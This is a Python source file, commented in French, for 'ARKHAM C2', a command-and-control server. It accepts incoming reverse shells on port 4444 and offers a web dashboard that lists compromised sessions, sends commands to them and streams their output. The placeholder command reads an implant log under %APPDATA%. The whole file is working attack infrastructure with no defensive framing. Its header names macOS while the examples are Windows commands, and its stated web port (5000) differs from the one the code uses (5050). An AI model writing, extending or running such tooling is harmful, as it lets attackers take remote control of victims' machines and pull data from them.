#!/usr/bin/env python3
# language: Python 3, file: arkham_c2.py, target: macOS
# ARKHAM C2 - la console de controle : shells entrants sur 4444, interface web sur 5000
# Usage: python3 arkham_c2.py [port_shell] [port_web]   (4444 / 5000)
import socket, threading, http.server, json, time, urllib.parse

SHELL_PORT = 4444
WEB_PORT = 5050
SESSIONS = {}          # sid -> {"sock","ip","buf","time"}
NEXT = [1]
LOCK = threading.Lock()

def listener(port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port)); srv.listen(5)
    print(f"[*] listener shell sur :{port}")
    while True:
        s, addr = srv.accept()
        sid = f"S{NEXT[0]:03d}"; NEXT[0] += 1
        with LOCK:
            SESSIONS[sid] = {"sock": s, "ip": addr[0], "buf": b"", "time": time.strftime("%H:%M:%S"),
                             "lock": threading.Lock()}
        print(f"[+] session {sid} - {addr[0]}")
        threading.Thread(target=pump, args=(sid, s), daemon=True).start()

def pump(sid, s):
    sess = SESSIONS.get(sid)
    while True:
        try:
            data = s.recv(4096)
            if not data: break
            with sess["lock"]: sess["buf"] += data
        except Exception:
            import traceback; traceback.print_exc(); print(f"    [pump] exception session {sid}", flush=True)
            break
    with LOCK:
        SESSIONS.pop(sid, None)
    print(f"[-] session {sid} fermee")

def send_cmd(sid, cmd):
    sess = SESSIONS.get(sid)
    if not sess: return False
    try:
        sess["sock"].sendall((cmd + "\n").encode())
        return True
    except Exception:
        return False

def read_out(sid):
    sess = SESSIONS.get(sid)
    if not sess: return None
    with sess["lock"]:
        out = sess["buf"]
        sess["buf"] = b""
    return out.decode(errors="ignore")

HTML = """<!doctype html><html><head><meta charset=utf8><title>ARKHAM C2</title>
<style>
body{background:#07070f;color:#ddd;font-family:monospace;margin:0;padding:24px}
h1{color:#ffd60a;margin:0 0 4px}h1 span{color:#c33;font-style:italic}
#grid{display:grid;grid-template-columns:230px 1fr;gap:16px;max-width:1100px}
#sess{background:#101018;border:1px solid #26262f;border-radius:10px;padding:12px;min-height:420px}
.sessItem{padding:10px;border:1px solid #2a2a35;border-radius:8px;margin-bottom:8px;cursor:pointer}
.sessItem.sel{border-color:#ffd60a;background:#1a1a10}
.sessItem small{color:#888;display:block}
#term{background:#000;border:1px solid #26262f;border-radius:10px;padding:14px;height:380px;overflow-y:auto;white-space:pre-wrap;font-size:.92em}
#cmdline{width:100%;background:#0a0a12;border:1px solid #ffd60a;color:#ffd60a;padding:10px;border-radius:8px;font-family:monospace;font-size:1em}
.stat{color:#4f4;font-size:.85em}
</style></head><body>
<h1>ARKHAM <span>C2</span> — powered by Maxime Leal</h1>
<div class="stat" id="stat">scanning…</div>
<div id="grid">
  <div id="sess"><b style="color:#ffd60a">SESSIONS</b><div id="sessList"></div></div>
  <div>
    <div id="term">⌁ en attente…</div>
    <input id="cmdline" placeholder="commande (ex: whoami · dir · type %APPDATA%\\Arkham\\sys.log)" autofocus>
  </div>
</div>
<script>
var sel = null;
async function refreshSessions(){
  const r = await fetch('/sessions'); const d = await r.json();
  const el = document.getElementById('sessList'); el.innerHTML = '';
  for (const [sid, s] of Object.entries(d)) {
    const div = document.createElement('div');
    div.className = 'sessItem' + (sid === sel ? ' sel' : '');
    div.innerHTML = `<b>${sid}</b> <small>${s.ip} · connecté ${s.time}</small>`;
    div.onclick = () => { sel = sid; refreshSessions(); document.getElementById('cmdline').focus(); };
    el.appendChild(div);
  }
  document.getElementById('stat').textContent =
    Object.keys(d).length + ' session(s) vivante(s) · listener :4444 · console :5050';
}
async function pollOut(){
  if (!sel) return;
  const r = await fetch('/out?sid=' + sel);
  const d = await r.json();
  if (d.out) { const t = document.getElementById('term'); t.textContent += d.out; t.scrollTop = t.scrollHeight; }
}
async function sendCmd(){
  if (!sel) return;
  const c = document.getElementById('cmdline').value;
  if (!c) return;
  document.getElementById('term').textContent += '\\n> ' + c + '\\n';
  document.getElementById('cmdline').value = '';
  await fetch('/cmd?sid=' + sel, {method:'POST', body: c});
}
setInterval(refreshSessions, 1500);
setInterval(pollOut, 900);
document.getElementById('cmdline').addEventListener('keydown', e => { if (e.key === 'Enter') sendCmd(); });
refreshSessions();
</script></body></html>"""

class H(http.server.BaseHTTPRequestHandler):
    def _json(self, obj):
        b = json.dumps(obj).encode()
        self.send_response(200); self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_GET(self):
        u = urllib.parse.urlparse(self.path); q = urllib.parse.parse_qs(u.query)
        if u.path == "/":
            b = HTML.encode()
            self.send_response(200); self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
        elif u.path == "/sessions":
            with LOCK:
                self._json({k: {"ip": v["ip"], "time": v["time"]} for k, v in SESSIONS.items()})
        elif u.path == "/out":
            sid = q.get("sid", [""])[0]
            out = read_out(sid)
            self._json({"out": out if out is not None else None})
    def do_POST(self):
        u = urllib.parse.urlparse(self.path); q = urllib.parse.parse_qs(u.query)
        if u.path == "/cmd":
            sid = q.get("sid", [""])[0]
            n = int(self.headers.get("Content-Length", 0))
            cmd = self.rfile.read(n).decode()
            ok = send_cmd(sid, cmd)
            self._json({"sent": ok})
    def log_message(self, *a): pass

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1: SHELL_PORT = int(sys.argv[1])
    if len(sys.argv) > 2: WEB_PORT = int(sys.argv[2])
    threading.Thread(target=listener, args=(SHELL_PORT,), daemon=True).start()
    print(f"[*] console web sur http://127.0.0.1:{WEB_PORT}")
    http.server.HTTPServer(("0.0.0.0", WEB_PORT), H).serve_forever()
